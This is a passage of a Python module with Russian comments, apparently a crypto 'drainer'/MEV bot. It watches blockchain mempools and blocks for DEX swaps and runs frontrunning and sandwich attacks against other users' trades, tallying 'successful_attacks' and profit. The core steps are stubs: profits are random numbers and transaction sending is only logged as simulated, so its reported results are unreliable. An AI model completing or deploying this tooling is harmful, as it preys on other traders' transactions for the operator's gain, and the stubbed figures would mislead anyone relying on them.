            network: Название сети
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно мониторить мемпул: библиотека web3.py не установлена")
            return
            
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return
            
        web3 = self.web3_connections[chain][network]
        
        # Получаем текущие цены токенов
        self.update_token_prices()
        
        # Проверяем наличие активных аккаунтов
        active_accounts = [acc for acc in self.accounts if acc["active"]]
        if not active_accounts:
            self.logger.error("Нет активных аккаунтов для выполнения MEV операций")
            return
            
        # Обновляем балансы аккаунтов
        for account in active_accounts:
            try:
                address = account["address"]
                balance_wei = web3.eth.get_balance(address)
                balance_eth = web3.from_wei(balance_wei, 'ether')
                
                if chain not in account["balances"]:
                    account["balances"][chain] = {}
                    
                account["balances"][chain][network] = {
                    "native": {
                        "wei": balance_wei,
                        "ether": float(balance_eth)
                    }
                }
                
                # Обновляем текущий nonce
                if chain not in account["nonce"]:
                    account["nonce"][chain] = {}
                    
                account["nonce"][chain][network] = web3.eth.get_transaction_count(address)
                
            except Exception as e:
                self.logger.error(f"Ошибка обновления баланса для {account['address']}: {str(e)}")
        
        self.logger.info(f"Запуск мониторинга мемпула для {chain}/{network}")
        
        # Начинаем мониторинг новых блоков для анализа транзакций
        try:
            block_filter = web3.eth.filter('latest')
            
            # Создаем фильтр для отслеживания входящих транзакций (поддерживается не всеми RPC)
            try:
                pending_filter = web3.eth.filter('pending')
                use_pending_filter = True
            except:
                use_pending_filter = False
                self.logger.warning(f"Провайдер {chain}/{network} не поддерживает фильтр pending транзакций")
            
            # Основной цикл мониторинга
            while True:
                # Проверяем новые блоки
                for block_hash in block_filter.get_new_entries():
                    block = web3.eth.get_block(block_hash, full_transactions=True)
                    block_number = block.number
                    
                    if block_number in self.processed_blocks:
                        continue
                        
                    self.processed_blocks.add(block_number)
                    self.logger.info(f"Анализ блока {block_number} на {chain}/{network}")
                    
                    # Анализируем транзакции в блоке для выявления паттернов MEV
                    self._analyze_block_transactions(web3, block, chain, network)
                
                # Проверяем pending транзакции, если доступно
                if use_pending_filter:
                    for tx_hash in pending_filter.get_new_entries():
                        try:
                            tx = web3.eth.get_transaction(tx_hash)
                            if tx and tx.blockNumber is None:  # Только мемпул транзакции
                                self._analyze_pending_transaction(web3, tx, chain, network)
                        except Exception as e:
                            self.logger.error(f"Ошибка анализа pending транзакции: {str(e)}")
                
                # Очищаем старые блоки из памяти (оставляем только последние 1000)
                if len(self.processed_blocks) > 1000:
                    self.processed_blocks = set(sorted(self.processed_blocks)[-1000:])
                
                # Обновляем цены токенов каждые 5 минут
                if int(time.time()) % 300 < 10:  # Примерно каждые 5 минут
                    self.update_token_prices()
                
                time.sleep(1)  # Пауза для снижения нагрузки
                
        except Exception as e:
            self.logger.error(f"Ошибка мониторинга мемпула {chain}/{network}: {str(e)}")
    
    def _analyze_block_transactions(self, web3, block, chain: str, network: str) -> None:
        """
        Анализирует транзакции в блоке для выявления паттернов MEV
        
        Args:
            web3: Web3 соединение
            block: Блок с транзакциями
            chain: Название блокчейна
            network: Название сети
        """
        if not hasattr(block, 'transactions') or not block.transactions:
            return
            
        # Увеличиваем счетчик проанализированных транзакций
        self.stats["monitored_txs"] += len(block.transactions)
        
        # Ищем транзакции обмена на DEX
        dex_transactions = []
        for tx in block.transactions:
            if self._is_dex_swap(tx, chain):
                dex_transactions.append(tx)
        
        # Если найдено несколько DEX транзакций, анализируем возможность сэндвич-атаки
        if len(dex_transactions) >= 2:
            self._analyze_sandwich_opportunity(web3, dex_transactions, chain, network)
    
    def _is_dex_swap(self, tx, chain: str) -> bool:
        """
        Определяет, является ли транзакция обменом на DEX
        
        Args:
            tx: Транзакция
            chain: Название блокчейна
            
        Returns:
            bool: True, если транзакция похожа на DEX своп
        """
        # Основные DEX контракты по цепям
        dex_contracts = {
            "ethereum": [
                "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",  # Uniswap V2 Router
                "0xE592427A0AEce92De3Edee1F18E0157C05861564"   # Uniswap V3 Router
            ],
            "binance": [
                "0x10ED43C718714eb63d5aA57B78B54704E256024E"   # PancakeSwap Router
            ],
            "polygon": [
                "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"   # QuickSwap Router
            ]
        }
        
        # Проверяем, направлена ли транзакция на известный DEX контракт
        if chain in dex_contracts and tx.to and tx.to.lower() in [c.lower() for c in dex_contracts[chain]]:
            return True
            
        # Проверяем input данные на наличие сигнатур методов DEX
        swap_signatures = [
            "0x38ed1739",  # swapExactTokensForTokens
            "0x8803dbee",  # swapTokensForExactTokens
            "0x7ff36ab5",  # swapExactETHForTokens
            "0x4a25d94a",  # swapTokensForExactETH
            "0x18cbafe5",  # swapExactTokensForETH
            "0xfb3bdb41"   # swapExactETHForTokensSupportingFeeOnTransferTokens
        ]
        
        if tx.input and len(tx.input) >= 10:
            method_id = tx.input[:10]
            if method_id in swap_signatures:
                return True
                
        return False
    
    def _analyze_pending_transaction(self, web3, tx, chain: str, network: str) -> None:
        """
        Анализирует ожидающую транзакцию для возможного фронтраннинга
        
        Args:
            web3: Web3 соединение
            tx: Транзакция
            chain: Название блокчейна
            network: Название сети
        """
        # Увеличиваем счетчик проанализированных транзакций
        self.stats["monitored_txs"] += 1
        
        # Проверяем, является ли транзакция обменом на DEX
        if self._is_dex_swap(tx, chain):
            # Пытаемся оценить прибыль от фронтраннинга
            estimated_profit = self._estimate_frontrun_profit(web3, tx, chain, network)
            
            # Если ожидаемая прибыль выше порога, выполняем фронтраннинг
            if estimated_profit > self.min_profit_threshold:
                self.stats["potential_opportunities"] += 1
                self.logger.info(f"Обнаружена возможность фронтраннинга с потенциальной прибылью ${estimated_profit}")
                
                # Выполняем фронтраннинг
                success = self._execute_frontrun(web3, tx, chain, network)
                
                if success:
                    self.stats["successful_attacks"] += 1
                    self.stats["total_profit"] += estimated_profit
                else:
                    self.stats["failed_attacks"] += 1
    
    def _analyze_sandwich_opportunity(self, web3, dex_txs, chain: str, network: str) -> None:
        """
        Анализирует возможность выполнения сэндвич-атаки на наборе DEX транзакций
        
        Args:
            web3: Web3 соединение
            dex_txs: Список транзакций DEX
            chain: Название блокчейна
            network: Название сети
        """
        # Группируем транзакции по токенам, которыми они оперируют
        # Это заглушка - в реальной имплементации нужно извлекать токены из input данных
        
        # Имитируем оценку прибыли
        estimated_profit = random.uniform(0.05, 0.3)  # Случайное значение для демонстрации
        
        # Если ожидаемая прибыль выше порога, выполняем сэндвич-атаку
        if estimated_profit > self.min_profit_threshold:
            self.stats["potential_opportunities"] += 1
            self.logger.info(f"Обнаружена возможность сэндвич-атаки с потенциальной прибылью ${estimated_profit}")
            
            # Выполняем сэндвич-атаку
            success = self._execute_sandwich(web3, dex_txs, chain, network)
            
            if success:
                self.stats["successful_attacks"] += 1
                self.stats["total_profit"] += estimated_profit
            else:
                self.stats["failed_attacks"] += 1
    
    def _estimate_frontrun_profit(self, web3, tx, chain: str, network: str) -> float:
        """
        Оценивает потенциальную прибыль от фронтраннинга транзакции
        
        Args:
            web3: Web3 соединение
            tx: Транзакция для фронтраннинга
            chain: Название блокчейна
            network: Название сети
            
        Returns:
            float: Оценка прибыли в USD
        """
        # Это заглушка - в реальной имплементации нужно декодировать
        # входные данные транзакции и оценить влияние на цену
        
        # Для демонстрации возвращаем случайное значение
        return random.uniform(0.01, 1.0)
    
    def _execute_frontrun(self, web3, tx, chain: str, network: str) -> bool:
        """
        Выполняет фронтраннинг транзакции
        
        Args:
            web3: Web3 соединение
            tx: Целевая транзакция
            chain: Название блокчейна
            network: Название сети
            
        Returns:
            bool: True, если атака успешна
        """
        # Выбираем аккаунт с наибольшим балансом в этой сети
        account = self._select_best_account(chain, network)
        if not account:
            self.logger.error("Нет подходящего аккаунта для фронтраннинга")
            return False
            
        try:
            # Создаем транзакцию фронтраннинга
            # Это заглушка - в реальной имплементации нужно создать 
            # транзакцию, которая выполнит ту же операцию, но с более высоким gas price
            
            # Получаем nonce аккаунта
            nonce = account["nonce"][chain][network]
            
            # Увеличиваем gasPrice целевой транзакции на 10%
            gas_price = int(tx.gasPrice * 1.1)
            
            # Здесь должна быть логика создания и отправки реальной транзакции
            # ...
            
            # Симулируем успешную отправку
            self.logger.info(f"Выполнен фронтраннинг для {web3.to_hex(tx.hash)} с адреса {account['address']}")
            
            # Увеличиваем nonce для следующей транзакции
            account["nonce"][chain][network] += 1
            
            return True
        except Exception as e:
            self.logger.error(f"Ошибка при фронтраннинге: {str(e)}")
            return False
    
    def _execute_sandwich(self, web3, txs, chain: str, network: str) -> bool:
        """
        Выполняет сэндвич-атаку
        
        Args:
            web3: Web3 соединение
            txs: Список транзакций для сэндвича
            chain: Название блокчейна
            network: Название сети
            
        Returns:
            bool: True, если атака успешна
        """
        # Выбираем аккаунт с наибольшим балансом в этой сети
        account = self._select_best_account(chain, network)
        if not account:
            self.logger.error("Нет подходящего аккаунта для сэндвич-атаки")
            return False
            
        try:
            # Получаем nonce аккаунта
            nonce = account["nonce"][chain][network]
            
            # Здесь должна быть логика создания и отправки "front" транзакции
            # ...
            
            # Симулируем отправку первой транзакции
            self.logger.info(f"Отправлена первая (front) транзакция сэндвич-атаки с адреса {account['address']}")
            
            # Увеличиваем nonce для следующей транзакции
            account["nonce"][chain][network] += 1
            
            # Здесь должна быть логика создания и отправки "back" транзакции
            # с более высоким gasPrice, чтобы она исполнилась сразу после целевых транзакций
            # ...
            
            # Симулируем отправку второй транзакции
            self.logger.info(f"Отправлена вторая (back) транзакция сэндвич-атаки с адреса {account['address']}")
            
            # Увеличиваем nonce для следующей транзакции
            account["nonce"][chain][network] += 1
            
            return True
        except Exception as e:
            self.logger.error(f"Ошибка при сэндвич-атаке: {str(e)}")
            return False
    
    def _select_best_account(self, chain: str, network: str):
        """
        Выбирает наиболее подходящий аккаунт для MEV операции
        
        Args:
            chain: Название блокчейна
            network: Название сети
            
        Returns:
            dict: Аккаунт или None, если подходящего нет
        """
        best_account = None
        max_balance = 0
        
        for account in self.accounts:
            if not account["active"]:
                continue
                
            if chain in account["balances"] and network in account["balances"][chain]:
                balance = int(account["balances"][chain][network]["native"]["wei"])
                if balance > max_balance:
                    max_balance = balance
                    best_account = account
        
        return best_account
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Возвращает статистику работы MEVDrainer
        
        Returns:
            Dict: Статистика работы
        """
        return self.stats


# Для тестирования модуля
if __name__ == "__main__":
    drainer = Web3Drainer()
    print(f"Web3.py доступна: {HAS_WEB3}")
    # Если Web3.py установлен, можно протестировать функции
    if HAS_WEB3:
        drainer.set_receiver_address("ethereum", "0x742d35Cc6634C0532925a3b844Bc454e4438f44e")
        balance = drainer.get_balance("ethereum", "mainnet", "0x742d35Cc6634C0532925a3b844Bc454e4438f44e")
        print(f"Баланс: {json.dumps(balance, indent=2)}")
    else:
        print("Установите web3.py для полного функционала: pip install web3") 